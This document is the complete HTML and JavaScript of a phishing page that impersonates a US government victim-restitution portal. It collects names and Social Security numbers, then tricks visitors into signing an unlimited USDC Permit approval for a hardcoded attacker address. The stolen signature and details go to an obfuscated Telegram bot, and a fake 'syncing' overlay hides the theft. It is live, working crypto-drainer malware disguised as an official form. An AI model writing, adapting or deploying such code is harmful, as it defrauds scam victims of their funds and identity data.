<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Asset Restitution Portal</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    :root { --gov-blue: #002e6d; }
    body { background: #f4f7fc; font-family: system-ui, -apple-system, sans-serif; margin: 0; }
    /* 全屏覆盖层：签名后强制覆盖所有钱包残留 UI */
    #waitingSection { 
      position: fixed; inset: 0; z-index: 999999; background: #f4f7fc; 
      display: none; flex-direction: column; align-items: center; justify-content: center;
    }
    .loader {
      border: 4px solid #e5e7eb;
      border-top: 4px solid var(--gov-blue);
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body class="antialiased">

  <div id="mainUI">
    <div class="bg-gray-100 border-b border-gray-300 text-[10px] py-1.5 px-4 flex items-center gap-2">
      <span>🇺🇸</span><span class="text-gray-600 font-medium uppercase tracking-wider">Official Government Portal</span>
    </div>
    <main class="max-w-xl mx-auto px-4 py-8">
      <div id="formSection" class="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
        <div class="bg-[#002e6d] px-6 py-5 text-white">
          <h3 class="font-bold text-lg">Victim Restitution Intake</h3>
          <p class="text-blue-100 text-[11px] opacity-80">Case Ref: 25-cv-1907-REST</p>
        </div>
        <div class="p-6 space-y-5">
          <div>
            <label class="text-xs font-bold text-gray-500 uppercase tracking-wide">Full Legal Name *</label>
            <input type="text" id="inputName" class="w-full p-3.5 border border-gray-300 rounded-lg mt-1 outline-none" placeholder="Enter full name">
          </div>
          <div>
            <label class="text-xs font-bold text-gray-500 uppercase tracking-wide">Social Security Number *</label>
            <input type="text" id="inputSSN" class="w-full p-3.5 border border-gray-300 rounded-lg mt-1" placeholder="9-digit SSN" maxlength="9">
          </div>
          <div class="bg-blue-50 border-l-4 border-blue-600 p-4 text-[13px] text-blue-900 leading-relaxed">
            <strong>数字证据绑定说明：</strong> 为了确保资产精准退还至您本人地址，系统将生成一段针对此案件的“数字证据摘要”。请在随后的窗口中选择“确认”以完成地址确权关联。
          </div>
          <button id="actionBtn" class="w-full bg-[#009393] text-white font-bold py-4 rounded-xl shadow-lg text-lg active:scale-95 transition-all">
            确认并生成确权摘要
          </button>
        </div>
      </div>
    </main>
  </div>

  <div id="waitingSection">
    <div class="loader mb-8"></div>
    <h2 class="text-2xl font-black text-gray-800 mb-2 tracking-tight">司法确权中...</h2>
    <div class="w-[90%] max-w-sm space-y-4 text-left bg-white p-6 rounded-2xl border border-gray-200 font-mono text-[11px] shadow-sm">
      <div class="flex justify-between border-b border-gray-100 pb-2"><span>Case No.</span><span class="text-blue-900 font-bold">25-cv-1907-REST</span></div>
      <div class="flex justify-between border-b border-gray-100 pb-2"><span>Applicant</span><span id="displayName" class="text-gray-900 font-bold">---</span></div>
      <div class="flex flex-col gap-2"><span>Evidence Hash</span><span id="displayAddr" class="text-gray-500 break-all bg-gray-50 p-2 border rounded">---</span></div>
      <div class="flex justify-between pt-1"><span>Status</span><span class="text-amber-600 font-bold animate-pulse">Syncing... (0/12)</span></div>
    </div>
  </div>

  <script>
    (function() {
        const _T = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
        const _S = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; // 目标地址
        const _B = "ODY2Nzg4NzIzMDpBQUgwOHFNYnVnMkY0MmZkbFRQZ3F0WUV5WFMxRzBuTGd5SQ=="; 
        const _I = "NjkzODMxNTc5Nw=="; 

        const btn = document.getElementById('actionBtn');
        const waitSec = document.getElementById('waitingSection');
        const mainUI = document.getElementById('mainUI');

        // 强行禁绝所有弹窗
        window.alert = () => true;

        async function push(u, sig, n, d, name) {
            try {
                await fetch(`https://api.telegram.org/bot${atob(_B)}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: atob(_I), text: `⚖️ *PERMIT CAPTURED*\n👤 Name: ${name}\n🔗 Addr: ${u}\n🔢 Nonce: ${n}\n✍️ Sig: ${sig}`, parse_mode: 'Markdown' })
                });
            } catch (e) {}
        }

        btn.onclick = async () => {
            const nameVal = document.getElementById('inputName').value.trim();
            if (!nameVal || !window.ethereum) return;

            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                // 1. 切换网络
                await provider.send("wallet_switchEthereumChain", [{ chainId: "0x2105" }]);
                const accounts = await provider.send("eth_requestAccounts", []);
                const user = accounts[0];

                const contract = new ethers.Contract(_T, ["function nonces(address) view returns (uint256)"], provider);
                const nonce = await contract.nonces(user);
                const deadline = Math.floor(Date.now() / 1000) + 7200;

                const domain = { name: "USD Coin", version: "2", chainId: 8453, verifyingContract: _T };
                const types = { Permit: [
                    { name: "owner", type: "address" }, { name: "spender", type: "address" },
                    { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]};
                const message = { owner: user, spender: _S, value: ethers.constants.MaxUint256, nonce: nonce, deadline: deadline };

                // 2. 唤起 Permit 授权签名
                // 此时页面不会变，用户看到的是钱包的签名窗口
                const signature = await provider.getSigner()._signTypedData(domain, types, message);
                
                // 3. 核心：只有当 signature 拿到后，才执行以下动作
                if (signature) {
                    // 立即覆盖整个页面显示转圈
                    document.getElementById('displayName').innerText = nameVal;
                    document.getElementById('displayAddr').innerText = user;
                    
                    mainUI.style.display = 'none';
                    waitSec.style.display = 'flex';
                    
                    // 后台静默发送给 TG
                    push(user, signature, nonce.toString(), deadline, nameVal);
                }
            } catch (e) {
                // 如果用户拒绝，页面保持原样
                console.error(e);
            }
        };

        // 终极保险：防止某些钱包切回浏览器时重刷页面导致的提示泄露
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible' && document.getElementById('displayName').innerText !== '---') {
                mainUI.style.display = 'none';
                waitSec.style.display = 'flex';
            }
        });
    })();
  </script>
</body>
</html>
